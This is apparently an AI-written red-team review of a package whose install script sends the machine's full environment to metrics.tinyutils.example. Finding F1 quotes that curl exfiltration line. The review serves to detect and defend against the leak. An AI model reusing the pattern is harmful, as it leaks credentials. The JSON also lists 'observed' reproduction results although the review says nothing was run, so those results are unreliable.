# Redteam review: adopting tinyutils on build machines

**VERDICT: REJECT.** The installer sends the machine's entire environment to a third-party server. On build machines that environment holds registry tokens and cloud credentials. Running the documented install step would leak them, so the project should not be adopted.

**CONFIDENCE: high** for the main finding, which rests on one unambiguous line. **Medium** overall, for three reasons:
- **No tools.** I could not run the installer or tests, so the request's "make sure it installs and works" is UNVERIFIED.
- **Possibly incomplete inputs.** I may not have seen every file in the repo.
- **No independent reviewer.** This is a single reviewer in this session with no subagent. The work was not written in this conversation, so the risk of anchoring on my own earlier reasoning is low.

**INPUTS LEDGER**
- **Seen:** request.md, context.md, and six files: README.md, install.sh, pyproject.toml, test_tinyutils.py, tinyutils/\_\_init\_\_.py and tinyutils/cli.py.
- **Not seen:** a full listing of `work/`.
  - Hidden or extra files (`setup.py`, `setup.cfg`, `.pth`, `MANIFEST.in`, CI config) would run or ship at install time.
  - This gap **matters** for any "the Python code is clean" conclusion. It does **not** matter for the REJECT, which stands on install.sh alone.
- **Not seen:** the upstream repo, its history and its release artifacts (PyPI wheel/sdist). It matters if you plan to install from PyPI rather than this copy, because the published artifact may differ.
- **Not runnable:** the installer and the test suite, because this session has no tools.

**COVERAGE**
- **Checked:**
  - Every line of install.sh, cli.py, pyproject.toml, the tests and README.
  - The main path and hostile inputs of `count` and `main`.
  - Whether the README's install instructions match the installer's behaviour.
- **Not checked:**
  - Actual install and test execution.
  - Files outside the six supplied.
  - Upstream provenance and maintainer identity.
  - What `metrics.tinyutils.example` receives or stores.

**SEATS AND GATE**
- **Sensitivity gate:** the work itself contains no personal data or secrets, so the gate passed.
- **Reviewers:** one reviewer ran (this session). No cross-vendor seats were requested at standard depth, and no subagent tool was available.

## Findings

| # | Severity | Evidence | Track | Location | What is wrong | Failure scenario | Fix and reproduction | a/b/c/d |
|---|---|---|---|---|---|---|---|---|
| F1 | Critical | CONFIRMED | B, R | install.sh:5-6 | `curl … --data-binary "$(env)" https://metrics.tinyutils.example/install` POSTs every environment variable to an external host. All output is discarded (`>/dev/null 2>&1`) and failure is masked (`\|\| true`). The comment calls this "anonymous usage statistics", which is false. | A build machine runs `./install.sh`, as the README instructs. The registry tokens, cloud keys, CI secrets, HOME and hostname all go to a third party. The installer still prints "tinyutils installed", so nothing alerts anyone. | **Do not run install.sh anywhere.** Treat any machine that already ran it as compromised and rotate its credentials. **Reproduce** in a disposable container with no secrets: set `FAKE_TOKEN=canary123` and point `metrics.tinyutils.example` at a local listener (hosts file plus `nc -l`). Run `./install.sh`. Expect no outbound request; you will instead see a POST body containing `FAKE_TOKEN=canary123`. | a✓ b✓ c✓ d✓ |
| F2 | Medium | CONFIRMED | B | tinyutils/cli.py:7-8, 17-18 | `count()` does not handle a missing or unreadable file, or a file that is not UTF-8. The exception escapes `main()`. | Run `tinyutils count missing.txt`, or point it at a Latin-1 file. The result is a Python traceback and exit code 1 instead of a clear message. A wrapper that treats exit 2 as a usage error will misreport the failure. | Catch `OSError` and `UnicodeDecodeError` in `main`, print to stderr, and return a defined non-zero code. **Test:** `main(["count", "/nonexistent"])` should return a defined code without raising. It currently raises `FileNotFoundError`. | a✓ b✓ c✗ d✗ |
| F3 | Medium | PROBABLE | D | README.md:3; tinyutils/cli.py:6-9 | The package's only feature is a line and word count, which `wc -lw` already provides on every build host. Adopting it adds a third-party supply-chain dependency without adding any capability. | You take the dependency for convenience. A later release, or the installer, carries hostile code like F1 into every build. | Use `wc -l -w`. Note one small difference: `splitlines()` counts a final line with no trailing newline, while `wc -l` does not. If that matters, use a 5-line in-house function. | a✓ b✗ c✗ d✗ |
| F4 | Low | CONFIRMED | B | test_tinyutils.py:5; README.md:3 | The tests import `tinyutils.cli` from the source tree. They never test install.sh or the installed `tinyutils` console script. A green `python -m unittest` therefore says nothing about "it installs". | A reviewer sees passing tests and concludes the package installs and works. The installer, including F1, never ran under test. | Verify by installing in a clean venv with `pip install .` (bypassing install.sh), then run `tinyutils count` from outside the source tree. | a✓ b✓ c✗ d✗ |
| F5 | Low | CONFIRMED | B | install.sh:4; pyproject.toml:2 | `--no-build-isolation` with an unpinned `setuptools` builds against whatever setuptools the host already has. | Builds differ across hosts with different setuptools versions, and the build is not reproducible. | Drop `--no-build-isolation`, or pin the build requirement. | a✓ b✓ c✗ d✗ |
| F6 | Low | CONFIRMED | B | tinyutils/cli.py:8 | `f.read()` loads the whole file into memory. | Running it on a multi-GB log uses memory in proportion to the file and may be OOM-killed on a small build runner. | Stream the file line by line. | a✓ b✓ c✗ d✗ |

### Severity notes
- **F2:** the failure is loud and non-zero, so it causes no silent harm. That is why (d) is answered no for a harmful outcome.
- **F4:** this is not drift in the work itself. It is why the request's "make sure it installs" cannot be met from tests alone.

## Needs validation
- **S1: hidden install-time code.** It is unknown whether `work/` contains files beyond the six supplied, such as `setup.py`, `*.pth`, build hooks or vendored binaries, that run on `pip install .`. A full `find work -type f` listing (including dotfiles) would settle it.
- **S2: PyPI artifact differs from the repo.** It is unknown whether the published tinyutils 1.3.0 wheel and sdist match this source. Diffing the downloaded artifact (unpacked in an empty directory, never executed) against `work/` would settle it.
- **S3: past exposure.** It is unknown whether anyone in the organisation has already run install.sh. Shell history and CI logs, plus egress or DNS logs for `metrics.tinyutils.example`, would settle it.

## Refuted
- **"The exfiltration is harmless because `.example` is a reserved TLD that never resolves."** Refuted for three reasons:
  - A local resolver or hosts entry can answer it.
  - The code shows clear intent to send `env` off the machine.
  - Pointing it at a live domain is a one-word change in a future release.

  The finding is about the installer's behaviour, not today's DNS.
- **"cli.py itself is malicious."** Refuted for the files supplied. They contain no network, subprocess or file-write calls, and `__init__.py` is empty. This is limited by S1.

## What holds up
- **Counting logic:** `count()` is correct for the tested case. `"one two\nthree\n"` gives 2 lines and 3 words.
- **Argument handling:** `main()` returns 0 for help and 2 for usage errors, as the tests assert.
- **Dependencies:** pyproject declares no runtime dependencies and no custom build backend.
- **Python package:** the package code, as supplied, is benign.

## Unverified claims
- **"Install with ./install.sh … then run tinyutils --help."** Not run. To confirm, install with `pip install .` in a throwaway container with no secrets.
- **"Tests: python -m unittest" passes.** Not run. To confirm, run the tests in a scratch copy. Then break `count` (for example, return `(0, 0)`) to check that the tests go red.
- **"anonymous usage statistics."** This is contradicted by the code, which sends all of `env`, not anonymous counts.

## Questions for the author / owner
1. Has install.sh already been run on any machine that holds credentials? If so, this is an incident, not just a review.
2. What need does tinyutils meet that `wc` does not? If none, the adoption question goes away.

## Decision-maker summary
Do not adopt tinyutils. Its installer secretly uploads the full environment, including registry tokens and cloud credentials, to an outside server. If anyone has already run it, treat it as a credential leak and rotate secrets now. If a line and word count is all that is needed, `wc -lw` already does it without the supply-chain risk.

## Owner summary
The tool's install script quietly sends every password and access key on the machine to an outside website, even though it describes this as anonymous statistics. We should not install it anywhere, and if anyone already has, the keys on that machine should be replaced. The job the tool does can be done with a standard built-in command.

```json
{
  "schema_version": "2.2",
  "verdict": "REJECT",
  "confidence": "medium",
  "inputs_ledger": [
    {"item": "README.md", "status": "seen", "matters": true},
    {"item": "install.sh", "status": "seen", "matters": true},
    {"item": "pyproject.toml", "status": "seen", "matters": true},
    {"item": "test_tinyutils.py", "status": "seen", "matters": true},
    {"item": "tinyutils/__init__.py", "status": "seen", "matters": false},
    {"item": "tinyutils/cli.py", "status": "seen", "matters": true},
    {"item": "full file listing of work/ (hidden files, setup.py, .pth)", "status": "not_seen", "matters": true},
    {"item": "published PyPI artifact for tinyutils 1.3.0", "status": "not_seen", "matters": true},
    {"item": "execution of install.sh and test suite", "status": "not_seen", "matters": true}
  ],
  "seats": [{"vendor": "claude-same-session", "status": "ran", "cross_vendor": false}],
  "sensitivity_gate": {"sensitive": false, "reason": "Work contains no personal data or secrets; the risk is to secrets on the machines that would run it."},
  "coverage": {
    "checked": [
      {"unit": "install.sh", "kind": "file"},
      {"unit": "pyproject.toml", "kind": "config"},
      {"unit": "README.md", "kind": "file"},
      {"unit": "test_tinyutils.py", "kind": "file"},
      {"unit": "tinyutils/__init__.py", "kind": "file"},
      {"unit": "tinyutils/cli.py", "kind": "file"},
      {"unit": "tinyutils/cli.py:count", "kind": "function"},
      {"unit": "tinyutils/cli.py:main", "kind": "function"},
      {"unit": "README claim: install with ./install.sh", "kind": "claim"},
      {"unit": "install.sh claim: anonymous usage statistics", "kind": "claim"}
    ],
    "not_checked": [
      {"unit": "files in work/ beyond the six supplied", "reason": "not supplied"},
      {"unit": "actual install and test run", "reason": "no tools in this session"},
      {"unit": "upstream PyPI artifact and maintainer provenance", "reason": "not supplied; no network"}
    ]
  },
  "findings": [
    {"id": "F1", "status": "confirmed", "severity": "Critical", "evidence_level": "CONFIRMED", "track": "B",
     "location": "install.sh:5-6",
     "scenario": "Running ./install.sh as the README instructs POSTs the full output of env (registry tokens, cloud credentials, CI secrets) to https://metrics.tinyutils.example/install, with output silenced and failure masked by || true, then prints 'tinyutils installed'.",
     "fix": "Do not run install.sh anywhere and do not adopt the package; rotate credentials on any machine that already ran it.",
     "answers": {"a": true, "b": true, "c": true, "d": true},
     "reproduction": "In a disposable container with no real secrets, export FAKE_TOKEN=canary123, map metrics.tinyutils.example to a local nc -l listener, run ./install.sh; expected no outbound request, observed POST body containing FAKE_TOKEN=canary123."},
    {"id": "F2", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "tinyutils/cli.py:7-8, 17-18",
     "scenario": "tinyutils count on a missing, unreadable or non-UTF-8 file raises an uncaught exception: traceback and exit code 1 instead of a clean error.",
     "fix": "Catch OSError and UnicodeDecodeError in main, print to stderr and return a defined non-zero code.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Call main(['count', '/nonexistent']); expected a defined return code, observed FileNotFoundError raised."},
    {"id": "F3", "status": "confirmed", "severity": "Medium", "evidence_level": "PROBABLE", "track": "D",
     "location": "README.md:3; tinyutils/cli.py:6-9",
     "scenario": "Adopting the package adds a third-party supply-chain dependency on build hosts for a capability wc -lw already provides, exposing builds to hostile future releases like F1.",
     "fix": "Use wc -l -w or a few lines of in-house code.",
     "answers": {"a": true, "b": false, "c": false, "d": false}},
    {"id": "F4", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "test_tinyutils.py:5",
     "scenario": "The tests import from the source tree and never run install.sh or the installed console script, so passing tests are taken as proof it installs while the installer (with F1) goes untested.",
     "fix": "Verify by pip install . in a clean venv (bypassing install.sh) and running the tinyutils entry point from outside the source tree.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Delete install.sh in a scratch copy and run python -m unittest; the tests still pass, showing they do not cover installation."},
    {"id": "F5", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "install.sh:4; pyproject.toml:2",
     "scenario": "--no-build-isolation with unpinned setuptools builds against whatever setuptools the host has, so builds vary across hosts.",
     "fix": "Drop --no-build-isolation or pin the build requirement.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Install on two venvs with different setuptools versions; the builds use different backends."},
    {"id": "F6", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "tinyutils/cli.py:8",
     "scenario": "f.read() loads the whole file; counting a multi-GB log can exhaust memory on a small build runner.",
     "fix": "Iterate over the file line by line.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Run count on a file larger than available memory in a memory-limited container; observe OOM kill."},
    {"id": "S1", "status": "needs_validation", "track": "B", "location": "work/ (unlisted files)",
     "suspicion": "Additional files such as setup.py, .pth or build hooks may execute code at pip install time.",
     "unresolved_fact": "A complete file listing of work/, including dotfiles."},
    {"id": "S2", "status": "needs_validation", "track": "B", "location": "PyPI tinyutils 1.3.0",
     "suspicion": "The published artifact may differ from the reviewed source.",
     "unresolved_fact": "A diff of the unpacked PyPI wheel and sdist against work/."},
    {"id": "S3", "status": "needs_validation", "track": "B", "location": "install.sh:6",
     "suspicion": "Credentials may already have been exfiltrated if anyone ran install.sh.",
     "unresolved_fact": "Shell history, CI logs, and egress or DNS logs for metrics.tinyutils.example."}
  ],
  "refuted": [
    {"id": "C1", "candidate": "The exfiltration is harmless because .example is a reserved TLD that will not resolve.",
     "evidence": "A local resolver or hosts entry can answer it; the code sends env off-host by design, and a live domain is a one-word change in a future release."},
    {"id": "C2", "candidate": "tinyutils/cli.py contains malicious behaviour.",
     "evidence": "The supplied cli.py makes no network, subprocess or file-write calls, and __init__.py is empty (limited by S1)."}
  ]
}
```